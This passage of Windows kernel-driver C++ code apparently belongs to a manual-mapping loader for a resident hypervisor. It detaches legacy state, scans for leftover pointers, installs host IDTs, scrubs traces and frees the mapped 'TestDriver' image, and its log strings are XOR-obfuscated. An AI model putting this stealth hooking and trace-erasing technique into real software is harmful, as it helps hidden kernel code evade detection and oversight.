            LOG_DEBUG(_XOR_("[mapDriver] legacy detach blocked: hv_diag not ready copied=0x%llX ver=%llu ghv=0x%llX ghv_size=0x%llX vt=0x%llX vt_bytes=0x%llX\n"),
                req->diag_copied,
                diag.version,
                diag.ghv,
                diag.ghv_size,
                diag.vt_hook_table_ptr,
                diag.vt_hook_table_bytes);
            return;
        }

        auto set_result = Utils::payloadExports->set_hv_diag(&diag, sizeof(diag));
        if (set_result != PAYLOAD_RESULT_OK)
        {
            req->stage = 5;
            LOG_DEBUG(_XOR_("[mapDriver] legacy detach blocked: set_hv_diag result=0x%llX\n"),
                set_result);
            return;
        }
    }

    req->stage = 6;
    req->result = mapdriver_set_payload_mode(
        hv::payload_mode_legacy_detach,
        PAYLOAD_LEGACY_DETACH_MODE_ARM);

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->new_flags = after.legacy_detach_flags;
        req->ghv_original = after.legacy_ghv_original;
        req->ghv_copy = after.legacy_ghv_copy;
        req->ghv_size = after.legacy_ghv_size;
        req->vt_hook_original = after.legacy_vt_hook_original;
        req->vt_hook_copy = after.legacy_vt_hook_copy;
        req->vt_hook_size = after.legacy_vt_hook_size;
        req->shadow_base = after.legacy_shadow_base;
        req->shadow_size = after.legacy_shadow_size;
        req->shadow_count = after.legacy_shadow_count;
        RtlCopyMemory(&req->payload, &after, sizeof(after));
    }
    // Keep stack pressure low: pool adoption may allocate/query memory-manager
    // state, so callers run it after this large legacy-detach frame returns.
}

enum mapdriver_freetest_scan_range : payload_u64
{
    MAPDRIVER_FREETEST_SCAN_NONE = 0,
    MAPDRIVER_FREETEST_SCAN_GHV = 1,
    MAPDRIVER_FREETEST_SCAN_VT_HOOK = 2,
    MAPDRIVER_FREETEST_SCAN_SHADOW = 3,
    MAPDRIVER_FREETEST_SCAN_STATUS = 4,
    MAPDRIVER_FREETEST_SCAN_DIAG = 5,
    MAPDRIVER_FREETEST_SCAN_HOST_DESC = 6,
    MAPDRIVER_FREETEST_SCAN_HOST_STATE = 7,
    MAPDRIVER_FREETEST_SCAN_DIRECT = 8,
    MAPDRIVER_FREETEST_SCAN_VCPU = 9,
    MAPDRIVER_FREETEST_SCAN_GLOBAL = 10,
};

static bool mapdriver_u64_in_range(payload_u64 value, payload_u64 base, payload_u64 size)
{
    if (!value || !base || !size)
        return false;

    payload_u64 end = base + size;
    if (end <= base)
        return false;

    return value >= base && value < end;
}

static void mapdriver_record_freetest_hit(mapctl_free_test* req,
                                          payload_u64 range_id,
                                          payload_u64 slot_addr,
                                          payload_u64 slot_offset,
                                          payload_u64 value)
{
    if (!req)
        return;

    ++req->scan_refs;
    switch (range_id)
    {
    case MAPDRIVER_FREETEST_SCAN_GHV:
        ++req->scan_ghv_refs;
        break;
    case MAPDRIVER_FREETEST_SCAN_VT_HOOK:
        ++req->scan_vth_refs;
        break;
    case MAPDRIVER_FREETEST_SCAN_SHADOW:
        ++req->scan_shadow_refs;
        break;
    default:
        break;
    }

    if (!req->scan_first_range)
    {
        req->scan_first_range = range_id;
        req->scan_first_addr = slot_addr;
        req->scan_first_offset = slot_offset;
        req->scan_first_value = value;
    }
}

static void mapdriver_reset_freetest_scan(mapctl_free_test* req)
{
    if (!req)
        return;

    req->scan_refs = 0;
    req->scan_ghv_refs = 0;
    req->scan_vth_refs = 0;
    req->scan_shadow_refs = 0;
    req->scan_first_range = 0;
    req->scan_first_addr = 0;
    req->scan_first_offset = 0;
    req->scan_first_value = 0;
}

static void mapdriver_scan_freetest_value(mapctl_free_test* req,
                                          payload_u64 range_id,
                                          payload_u64 slot_addr,
                                          payload_u64 slot_offset,
                                          payload_u64 value,
                                          payload_u64 test_base,
                                          payload_u64 test_size)
{
    if (!req || !mapdriver_u64_in_range(value, test_base, test_size))
        return;

    mapdriver_record_freetest_hit(req, range_id, slot_addr, slot_offset, value);
}

static bool mapdriver_freetest_slot_is_vtcallstack_scratch(payload_u64 range_id,
                                                           payload_u64 slot_addr,
                                                           const mapctl_hv_diag* diag)
{
    if (range_id != MAPDRIVER_FREETEST_SCAN_GHV ||
        !diag ||
        !diag->ghv ||
        !diag->ghv_off_vtcallstack_list)
    {
        return false;
    }

    payload_u64 stack_size = diag->host_stack_size;
    if (stack_size < PAGE_SIZE || stack_size > 0x100000ull)
        stack_size = 0x10000ull;

    // TestDriver::ghv_vtcallstack_list layout:
    //   spin_lock lock;                     // 4 bytes + align
    //   ghv_vtcallstack_node buffer[32];
    // ghv_vtcallstack_node layout:
    //   next(8), stack_ptr(8), stack[host_stack_size],
    //   cpu_number(4), pad(4), old_stack_ptr(8)
    //
    // The inline stack[] buffers preserve old root-mode stack bytes.  They
    // naturally contain return addresses into TestDriver code, but those are
    // stale stack snapshots, not live resident pointers.  Blocking freetest on
    // them produces false positives like ghv+0x1232188 -> TestDriver+0x5044D.
    static constexpr payload_u64 kListBufferOffset = 0x8ull;
    static constexpr payload_u64 kNodeStackOffset = 0x10ull;
    static constexpr payload_u64 kNodeTailBytes = 0x10ull;
    static constexpr payload_u64 kNodeCount = 32ull;

    payload_u64 list_base = diag->ghv + diag->ghv_off_vtcallstack_list;
    if (list_base < diag->ghv)
        return false;

    payload_u64 node_size = kNodeStackOffset + stack_size + kNodeTailBytes;
    payload_u64 buffer_base = list_base + kListBufferOffset;
    if (buffer_base < list_base || !node_size)
        return false;

    for (payload_u64 i = 0; i < kNodeCount; ++i)
    {
        payload_u64 node = buffer_base + i * node_size;
        payload_u64 stack_begin = node + kNodeStackOffset;
        payload_u64 stack_end = stack_begin + stack_size;
        if (node < buffer_base || stack_begin < node || stack_end < stack_begin)
            return false;

        if (slot_addr >= stack_begin && (slot_addr + sizeof(payload_u64)) <= stack_end)
            return true;
    }

    return false;
}

static void mapdriver_scan_freetest_range(mapctl_free_test* req,
                                          payload_u64 range_id,
                                          payload_u64 scan_base,
                                          payload_u64 scan_size,
                                          payload_u64 test_base,
                                          payload_u64 test_size,
                                          const mapctl_hv_diag* diag)
{
    if (!req || !scan_base || !scan_size || !test_base || !test_size)
        return;

    payload_u64 scan_end = scan_base + scan_size;
    if (scan_end <= scan_base)
        return;

    // These ranges should be resident payload-owned allocations.  Keep the
    // scan bounded so a corrupt diag cannot turn freetest into a long probe.
    if (scan_size > 0x4000000ull)
        return;

    __try
    {
        auto ptr = (volatile payload_u64*)scan_base;
        payload_u64 count = scan_size / sizeof(payload_u64);
        for (payload_u64 i = 0; i < count; ++i)
        {
            payload_u64 value = ptr[i];
            if (mapdriver_u64_in_range(value, test_base, test_size))
            {
                payload_u64 slot_addr = scan_base + i * sizeof(payload_u64);
                if (mapdriver_freetest_slot_is_vtcallstack_scratch(range_id, slot_addr, diag))
                    continue;

                mapdriver_record_freetest_hit(
                    req,
                    range_id,
                    slot_addr,
                    i * sizeof(payload_u64),
                    value);
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest scan fault range=%llu base=0x%llX size=0x%llX code=0x%X\n"),
            range_id, scan_base, scan_size, GetExceptionCode());
    }
}

static void mapdriver_scan_freetest_status_copy(mapctl_free_test* req,
                                                const payload_status& ps,
                                                payload_u64 test_base,
                                                payload_u64 test_size)
{
    if (!req)
        return;

#define MAPDRIVER_SCAN_PS_FIELD(_field)                                                \
    mapdriver_scan_freetest_value(                                                     \
        req,                                                                           \
        MAPDRIVER_FREETEST_SCAN_STATUS,                                                \
        (payload_u64)&ps._field,                                                       \
        (payload_u64)((const char*)&ps._field - (const char*)&ps),                     \
        ps._field,                                                                     \
        test_base,                                                                     \
        test_size)

    // Scan fields with control-flow or mutable-legacy ownership semantics.  Do
    // not scan diagnostic rings wholesale here: historical guest RIP samples can
    // legitimately contain TestDriver addresses after the CRT wrapper has run,
    // but they are not live VMX-root call targets.  The strict runtime memory
    // scan below covers resident structures that can still be dereferenced.
    MAPDRIVER_SCAN_PS_FIELD(vmexit_target);
    MAPDRIVER_SCAN_PS_FIELD(vmexit_bridge_target);
    MAPDRIVER_SCAN_PS_FIELD(vmexit_bridge_forward_last_guest_rip);
    MAPDRIVER_SCAN_PS_FIELD(vmexit_forward_badkey_last_rip);
    MAPDRIVER_SCAN_PS_FIELD(vmexit_forward_nonvm_last_rip);
    MAPDRIVER_SCAN_PS_FIELD(vtret_last_rip);
    MAPDRIVER_SCAN_PS_FIELD(tramp_last_target);
    MAPDRIVER_SCAN_PS_FIELD(hook_last_target);
    MAPDRIVER_SCAN_PS_FIELD(pmo_last_target);
    MAPDRIVER_SCAN_PS_FIELD(payload_gamevt_image_base);
    MAPDRIVER_SCAN_PS_FIELD(payload_gamevt_driver_unload);
    MAPDRIVER_SCAN_PS_FIELD(getbuffer_install_target);
    MAPDRIVER_SCAN_PS_FIELD(getbuffer_install_blank);
    MAPDRIVER_SCAN_PS_FIELD(getbuffer_install_fake);
    MAPDRIVER_SCAN_PS_FIELD(getbuffer_install_tramp);
    MAPDRIVER_SCAN_PS_FIELD(vmexit_bridge_ctx_set_last_ptr);

#undef MAPDRIVER_SCAN_PS_FIELD
}

static void mapdriver_scan_freetest_diag_copy(mapctl_free_test* req,
                                              const mapctl_hv_diag& diag,
                                              payload_u64 test_base,
                                              payload_u64 test_size)
{
    if (!req)
        return;

    auto base = (payload_u64)&diag;
    auto ptr = (const volatile payload_u64*)&diag;
    payload_u64 count = sizeof(diag) / sizeof(payload_u64);
    for (payload_u64 i = 0; i < count; ++i)
    {
        mapdriver_scan_freetest_value(
            req,
            MAPDRIVER_FREETEST_SCAN_DIAG,
            base + i * sizeof(payload_u64),
            i * sizeof(payload_u64),
            ptr[i],
            test_base,
            test_size);
    }
}

static void mapdriver_scan_freetest_globals(mapctl_free_test* req,
                                            payload_u64 test_base,
                                            payload_u64 test_size)
{
    if (!req)
        return;

    mapdriver_scan_freetest_value(
        req,
        MAPDRIVER_FREETEST_SCAN_GLOBAL,
        (payload_u64)&g_testdriver_boot_flags_ptr,
        0,
        g_testdriver_boot_flags_ptr,
        test_base,
        test_size);

    mapdriver_scan_freetest_value(
        req,
        MAPDRIVER_FREETEST_SCAN_GLOBAL,
        (payload_u64)&Utils::testDriver.DriverUnload,
        sizeof(payload_u64),
        (payload_u64)Utils::testDriver.DriverUnload,
        test_base,
        test_size);
}

static void mapdriver_scan_freetest_payload_runtime_refs(mapctl_free_test* req,
                                                         const payload_status& ps,
                                                         const mapctl_hv_diag* diag,
                                                         payload_u64 test_base,
                                                         payload_u64 test_size)
{
    if (!req)
        return;

    payload_u64 desc_count = ps.host_stack_desc_count;
    if (diag && diag->vcpu_count && diag->vcpu_count < desc_count)
        desc_count = diag->vcpu_count;
    if (desc_count > 64)
        desc_count = 64;
    payload_u64 desc_bytes = desc_count * (payload_u64)sizeof(payload_host_stack_descriptor);
    mapdriver_scan_freetest_range(
        req,
        MAPDRIVER_FREETEST_SCAN_HOST_DESC,
        ps.host_stack_desc_base,
        desc_bytes,
        test_base,
        test_size,
        diag);

    mapdriver_scan_freetest_range(
        req,
        MAPDRIVER_FREETEST_SCAN_HOST_STATE,
        ps.host_state_base,
        ps.host_state_size,
        test_base,
        test_size,
        diag);

    mapdriver_scan_freetest_range(
        req,
        MAPDRIVER_FREETEST_SCAN_DIRECT,
        ps.direct_alloc_base,
        ps.direct_alloc_size,
        test_base,
        test_size,
        diag);

    if (diag &&
        diag->vcpus &&
        diag->vcpu_count &&
        diag->vcpu_stride >= 0x100ull &&
        diag->vcpu_stride <= 0x100000ull)
    {
        payload_u64 vcpu_count = diag->vcpu_count;
        if (vcpu_count > 64)
            vcpu_count = 64;
        payload_u64 bytes = vcpu_count * diag->vcpu_stride;
        if (bytes / diag->vcpu_stride == vcpu_count && bytes <= 0x400000ull)
        {
            mapdriver_scan_freetest_range(
                req,
                MAPDRIVER_FREETEST_SCAN_VCPU,
                diag->vcpus,
                bytes,
                test_base,
                test_size,
                diag);
        }
    }
}

static void mapdriver_scan_freetest_live_refs(mapctl_free_test* req,
                                              const payload_status& ps,
                                              payload_u64 test_base,
                                              payload_u64 test_size,
                                              const mapctl_hv_diag* diag)
{
    if (!req)
        return;

    mapdriver_scan_freetest_range(
        req,
        MAPDRIVER_FREETEST_SCAN_GHV,
        ps.legacy_ghv_copy,
        ps.legacy_ghv_size,
        test_base,
        test_size,
        diag);

    mapdriver_scan_freetest_range(
        req,
        MAPDRIVER_FREETEST_SCAN_VT_HOOK,
        ps.legacy_vt_hook_copy,
        ps.legacy_vt_hook_size,
        test_base,
        test_size,
        diag);

    mapdriver_scan_freetest_range(
        req,
        MAPDRIVER_FREETEST_SCAN_SHADOW,
        ps.legacy_shadow_base,
        ps.legacy_shadow_size,
        test_base,
        test_size,
        diag);
}

static void mapdriver_install_payload_host_idt_for_freetest(mapctl_free_test* req, payload_u64 count)
{
    if (!req)
        return;

    req->hostidt_result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->hostidt_requested = count;
    req->hostidt_ready = 0;
    req->hostidt_failed_index = ~0ull;

    if (!count)
        return;

    if (count > 64)
        count = 64;
    req->hostidt_requested = count;

    for (payload_u64 i = 0; i < count; ++i)
    {
        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        payload_u64 result = PAYLOAD_RESULT_INVALID_CONTEXT;
        __try
        {
            // HOST_IDT installation is only meaningful from VMX-root with a
            // current VMCS.  Do not route this through mapdriver_set_payload_mode:
            // before unload_common() g_payload_detached is still false, so that
            // helper falls back to payload direct exports, and HOST_IDT has no
            // direct-export equivalent.  After switchbridge the resident payload
            // already owns VM-exit dispatch, so issue the hypercall explicitly.
            result = mapdriver_hv_ready()
                ? hv::vmcall_set_payload_mode(
                    hv::payload_mode_host_idt,
                    PAYLOAD_HOST_IDT_MODE_INSTALL)
                : PAYLOAD_RESULT_INVALID_CONTEXT;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            result = PAYLOAD_RESULT_INVALID_CONTEXT;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        if (result != PAYLOAD_RESULT_OK)
        {
            req->hostidt_failed_index = i;
            req->hostidt_result = result;
            return;
        }

        req->hostidt_ready++;
    }

    req->hostidt_result = (req->hostidt_ready == req->hostidt_requested)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static bool mapdriver_install_payload_host_idt_for_active_vcpus(const char* phase)
{
    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return false;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }

    mapctl_free_test tmp = {};
    payload_u64 count = diag.vcpu_count;
    if (count > 64)
        count = 64;

    mapdriver_install_payload_host_idt_for_freetest(&tmp, count);
    LOG_DEBUG(_XOR_("[mapDriver] hostidt %s result=0x%llX done=%llu/%llu failed=%llu\n"),
        phase ? phase : "install",
        tmp.hostidt_result,
        tmp.hostidt_ready,
        tmp.hostidt_requested,
        tmp.hostidt_failed_index);

    return tmp.hostidt_result == PAYLOAD_RESULT_OK &&
        tmp.hostidt_ready == tmp.hostidt_requested;
}

static void mapdriver_scrub_payload_host_desc_for_freetest(const payload_status& ps,
                                                           payload_u64 count,
                                                           payload_u64 old_test_base,
                                                           payload_u64 old_test_size)
{
    if (!ps.host_stack_desc_base || !ps.host_stack_desc_count)
        return;

    if (count > ps.host_stack_desc_count)
        count = ps.host_stack_desc_count;
    if (count > 64)
        count = 64;

    auto desc = (payload_host_stack_descriptor*)ps.host_stack_desc_base;
    __try
    {
        for (payload_u64 i = 0; i < count; ++i)
        {
            if (mapdriver_va_in_range(desc[i].old_rip, old_test_base, old_test_size, sizeof(payload_u64)))
            {
                desc[i].old_rip = 0;
                desc[i].flags &= ~(4ull | 8ull);
            }
            if (mapdriver_va_in_range(desc[i].last_rip, old_test_base, old_test_size, sizeof(payload_u64)))
                desc[i].last_rip = 0;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
}

static void mapdriver_free_test_image_control(mapctl_free_test* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->hv_ready = mapdriver_hv_ready() ? 1 : 0;
    req->payload_detached = (payload_u64)g_payload_detached;
    req->test_unloaded = Utils::testDriverUnloaded ? 1 : 0;
    req->test_quarantined = Utils::testDriverImageQuarantined ? 1 : 0;
    req->test_before = (payload_u64)Utils::imageBase;
    req->test_size_before = (payload_u64)Utils::imageSize;
    req->test_after = req->test_before;
    req->test_size_after = req->test_size_before;
    req->bridge = 0;
    req->bridge_target = 0;
    req->bridge_forward_count = 0;
    req->vcpu_requested = 0;
    req->vcpu_ready = 0;
    req->failed_index = ~0ull;
    req->last_rip = 0;
    req->last_rsp = 0;
    req->legacy_detached = 0;
    req->legacy_detach_flags = 0;
    req->legacy_detach_result = 0;
    mapdriver_reset_freetest_scan(req);
    req->cutover_restore_result = 0;
    req->cutover_clear_result = 0;
    req->hostidt_requested = 0;
    req->hostidt_ready = 0;
    req->hostidt_failed_index = ~0ull;
    req->hostidt_result = 0;
    req->crt_keep_result = 0;
    req->crt_unload_called = Utils::testDriverUnloadCallbackCalled ? 1 : 0;
    req->free_phase = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_RELEASE_LEGACY_IMAGE_MAGIC ||
        req->size < sizeof(mapctl_free_test) ||
        req->arm != MAPCTL_RELEASE_LEGACY_IMAGE_ARM)
    {
        return;
    }

    if (!req->hv_ready ||
        !g_payload_detached ||
        !Utils::imageBase ||
        !Utils::imageSize ||
        !Utils::testDriverUnloaded ||
        !Utils::testDriverImageQuarantined)
    {
        return;
    }

    payload_status ps = {};
    if (!mapdriver_query_payload_status(&ps) ||
        !mapdriver_payload_barrier_ready(&ps) ||
        !ps.vmexit_bridge)
    {
        return;
    }

    req->bridge = ps.vmexit_bridge;
    req->bridge_target = ps.vmexit_bridge_target;
    req->bridge_forward_count = ps.vmexit_bridge_forward_count;
    req->legacy_detached = ps.legacy_detached;
    req->legacy_detach_flags = ps.legacy_detach_flags;
    req->legacy_detach_result = ps.legacy_detach_result;
    RtlCopyMemory(&req->payload, &ps, sizeof(ps));

    if (!ps.legacy_detached ||
        ps.legacy_detach_result != PAYLOAD_RESULT_OK ||
        ((ps.legacy_detach_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) == 0))
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: legacy data not detached result=0x%llX flags=0x%llX\n"),
            ps.legacy_detach_result,
            ps.legacy_detach_flags);
        return;
    }

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    mapdriver_scan_freetest_live_refs(req, ps, req->test_before, req->test_size_before, &diag);
    payload_u64 blocking_refs = req->scan_ghv_refs + req->scan_vth_refs;
    if (blocking_refs)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: live TestDriver refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
            req->scan_refs,
            req->scan_ghv_refs,
            req->scan_vth_refs,
            req->scan_shadow_refs,
            req->scan_first_range,
            req->scan_first_addr,
            req->scan_first_offset,
            req->scan_first_value);
        return;
    }

    // Do not free TestDriver while any fallback path is still possible.
    if (ps.vmexit_bridge_target != 0 ||
        ps.vmexit_bridge_forward_count != 0 ||
        ps.vmexit_bridge_forward_bad_key != 0 ||
        ps.vmexit_bridge_forward_unknown_code != 0 ||
        ps.vmexit_bridge_forward_non_vmcall != 0)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: target=0x%llX fwd=%llu bad=%llu unk=%llu non=%llu\n"),
            ps.vmexit_bridge_target,
            ps.vmexit_bridge_forward_count,
            ps.vmexit_bridge_forward_bad_key,
            ps.vmexit_bridge_forward_unknown_code,
            ps.vmexit_bridge_forward_non_vmcall);
        return;
    }

    UINT64 count = diag.vcpu_count;
    if (count > 64)
        count = 64;
    req->vcpu_requested = count;
    bool const amd_resident = (diag.flags & 2ull) != 0;

    if (amd_resident)
    {
        payload_u64 ack = 0;
        __try
        {
            ack = (Utils::payloadExports && Utils::payloadExports->activate_amd_svm)
                ? Utils::payloadExports->activate_amd_svm(PAYLOAD_AMD_SVM_ACTIVATE_QUERY)
                : 0;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            ack = 0;
        }

        req->vcpu_ready = ack;
        req->last_rip = 0;
        req->last_rsp = diag.vmcs_host_rsp;
        if (ack != count)
        {
            req->failed_index = ack < count ? ack : 0;
            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: AMD resident ack=%llu/%llu\n"),
                ack, count);
            return;
        }
    }
    else for (UINT64 i = 0; i < count; ++i)
    {
        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        RtlZeroMemory(&diag, sizeof(diag));
        bool ok = false;
        __try
        {
            auto copied = mapdriver_get_resident_hv_diag(&diag);
            ok = mapdriver_hv_diag_valid(diag, copied);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            ok = false;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        req->last_rip = diag.vmcs_host_rip;
        req->last_rsp = diag.vmcs_host_rsp;
        if (!ok ||
            diag.vmcs_host_rip != ps.vmexit_bridge ||
            !ps.host_stack_base ||
            !ps.host_stack_size ||
            diag.vmcs_host_rsp < ps.host_stack_base ||
            diag.vmcs_host_rsp >= (ps.host_stack_base + ps.host_stack_size))
        {
            req->failed_index = i;
            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: vcpu=%llu ok=%d rip=0x%llX bridge=0x%llX rsp=0x%llX stack=0x%llX/0x%llX\n"),
                i, (int)ok, diag.vmcs_host_rip, ps.vmexit_bridge,
                diag.vmcs_host_rsp, ps.host_stack_base, ps.host_stack_size);
            return;
        }

        req->vcpu_ready++;
    }

    if (!amd_resident)
    {
        mapdriver_install_payload_host_idt_for_freetest(req, count);
        if (req->hostidt_result != PAYLOAD_RESULT_OK ||
            req->hostidt_ready != req->hostidt_requested)
        {
            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: host idt install result=0x%llX done=%llu/%llu failed=%llu\n"),
                req->hostidt_result,
                req->hostidt_ready,
                req->hostidt_requested,
                req->hostidt_failed_index);
            return;
        }
    }
    else
    {
        req->hostidt_requested = count;
        req->hostidt_ready = count;
        req->hostidt_failed_index = ~0ull;
        req->hostidt_result = PAYLOAD_RESULT_OK;
    }

    // After this point the old TestDriver image may be released.  Remove every
    // restore/fallback breadcrumb that can point a later control path back into
    // that image: payload trampoline target, saved bridge target, cached diag
    // handler/image fields, KEEP shadow, and per-vCPU old_rip descriptors.
    mapdriver_scrub_payload_host_desc_for_freetest(
        ps,
        count,
        req->test_before,
        req->test_size_before);
    req->cutover_restore_result =
        mapdriver_set_payload_mode(hv::payload_mode_cutover, PAYLOAD_CUTOVER_MODE_RELEASE);
    if (req->cutover_restore_result != PAYLOAD_RESULT_OK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: release finalizer failed result=0x%llX\n"),
            req->cutover_restore_result);
        return;
    }

    // The first RELEASE clears the old VM-exit targets, but intentionally keeps
    // the cached TestDriver global pointers alive until the CRT DriverUnload
    // wrapper can run below.  Re-scan only the legacy resident ranges here; the
    // full status/diag/host-descriptor/global fail-closed gate runs after the
    // second RELEASE immediately before MmFreeIndependentPages.
    payload_status ps_after_release = {};
    if (!mapdriver_query_payload_status(&ps_after_release))
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: payload status unavailable after release finalizer\n"));
        return;
    }
    mapdriver_reset_freetest_scan(req);
    mapdriver_scan_freetest_live_refs(req, ps_after_release, req->test_before, req->test_size_before, &diag);
    blocking_refs = req->scan_ghv_refs + req->scan_vth_refs + req->scan_shadow_refs;
    if (blocking_refs)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked after release finalizer: refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
            req->scan_refs,
            req->scan_ghv_refs,
            req->scan_vth_refs,
            req->scan_shadow_refs,
            req->scan_first_range,
            req->scan_first_addr,
            req->scan_first_offset,
            req->scan_first_value);
        return;
    }

    LOG_DEBUG(_XOR_("[mapDriver] freetest release prep TestDriver image base=%p size=0x%X vcpus=%llu\n"),
        Utils::imageBase, Utils::imageSize, req->vcpu_ready);
    req->free_phase = 1;
    // Do NOT restore the old TestDriver handle_vm_exit target around the final
    // free.  Once MmFreeIndependentPages releases the image pages, even a tiny
    // window with bridge_target still pointing at TestDriver can send a late
    // VM-exit into freed code.  The resident no-target path must handle the
    // release window by itself.
    req->free_phase = 2;

    // Before releasing the manually mapped TestDriver image, run its WDM
    // DriverUnload wrapper exactly once while KEEP_HV_ON_UNLOAD is forced.
    // The user's Driver_Unload returns early, so resident VT keeps running,
    // but the MSVC/UCXXRT wrapper still tears down CRT globals such as the
    // per-driver lookaside/PTD list.  If we skip this and free the image, the
    // kernel's periodic ExpScanGeneralLookasideList later walks a stale list
    // entry inside the freed TestDriver image and bugchecks.
    req->crt_keep_result = PAYLOAD_RESULT_INVALID_CONTEXT;
    __try
    {
        bool keep_set = mapdriver_direct_set_keep_hv_on_unload(true);
        if (!keep_set)
            keep_set = hv::vmcall_set_keep_hv_on_unload(true) != 0;
        req->crt_keep_result = keep_set
            ? PAYLOAD_RESULT_OK
            : PAYLOAD_RESULT_INVALID_CONTEXT;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        req->crt_keep_result = PAYLOAD_RESULT_INVALID_CONTEXT;
    }

    if (req->crt_keep_result != PAYLOAD_RESULT_OK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: failed to force KEEP_HV before CRT unload result=0x%llX\n"),
            req->crt_keep_result);
        return;
    }

    if (!Utils::testDriverUnloadCallbackCalled)
    {
        Utils::testDriverUnloaded = FALSE;
        Utils::UnloadDriverEx(FALSE);
    }
    req->crt_unload_called = Utils::testDriverUnloadCallbackCalled ? 1 : 0;
    if (!req->crt_unload_called)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: TestDriver DriverUnload wrapper did not complete\n"));
        return;
    }
    g_testdriver_boot_flags_ptr = 0;
    Utils::testDriver.DriverUnload = nullptr;

    req->cutover_restore_result =
        mapdriver_set_payload_mode(hv::payload_mode_cutover, PAYLOAD_CUTOVER_MODE_RELEASE);
    if (req->cutover_restore_result != PAYLOAD_RESULT_OK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: release finalizer after CRT failed result=0x%llX\n"),
            req->cutover_restore_result);
        return;
    }

    payload_status ps_before_free = {};
    if (!mapdriver_query_payload_status(&ps_before_free) ||
        !mapdriver_payload_barrier_ready(&ps_before_free) ||
        !ps_before_free.vmexit_bridge)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: payload status unavailable before final free\n"));
        return;
    }

    mapctl_hv_diag diag_before_free = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag_before_free);
        if (!mapdriver_hv_diag_valid(diag_before_free, copied) || !diag_before_free.vcpu_count)
        {
            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: hv diag unavailable before final free copied=%llu\n"),
                copied);
            return;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: hv diag exception before final free code=0x%X\n"),
            GetExceptionCode());
        return;
    }

    req->bridge = ps_before_free.vmexit_bridge;
    req->bridge_target = ps_before_free.vmexit_bridge_target;
    req->bridge_forward_count = ps_before_free.vmexit_bridge_forward_count;
    RtlCopyMemory(&req->payload, &ps_before_free, sizeof(ps_before_free));

    mapdriver_reset_freetest_scan(req);
    mapdriver_scan_freetest_live_refs(
        req,
        ps_before_free,
        req->test_before,
        req->test_size_before,
        &diag_before_free);
    mapdriver_scan_freetest_payload_runtime_refs(
        req,
        ps_before_free,
        &diag_before_free,
        req->test_before,
        req->test_size_before);
    mapdriver_scan_freetest_status_copy(
        req,
        ps_before_free,
        req->test_before,
        req->test_size_before);
    mapdriver_scan_freetest_diag_copy(
        req,
        diag_before_free,
        req->test_before,
        req->test_size_before);
    mapdriver_scan_freetest_globals(
        req,
        req->test_before,
        req->test_size_before);

    if (req->scan_refs)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked before final free: refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
            req->scan_refs,
            req->scan_ghv_refs,
            req->scan_vth_refs,
            req->scan_shadow_refs,
            req->scan_first_range,
            req->scan_first_addr,
            req->scan_first_offset,
            req->scan_first_value);
        return;
    }

    req->free_phase = 3;
    LOG_DEBUG(_XOR_("[mapDriver] freetest freeing TestDriver image base=%p size=0x%X vcpus=%llu\n"),
        Utils::imageBase, Utils::imageSize, req->vcpu_ready);
    Utils::UnloadDriverEx(TRUE);
    req->free_phase = 4;
    req->cutover_clear_result =
        mapdriver_set_payload_mode(hv::payload_mode_cutover, PAYLOAD_CUTOVER_MODE_CLEAR);
    if (req->cutover_clear_result != PAYLOAD_RESULT_OK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] freetest warning: cutover clear after free result=0x%llX\n"),
            req->cutover_clear_result);
    }

    req->test_after = (payload_u64)Utils::imageBase;
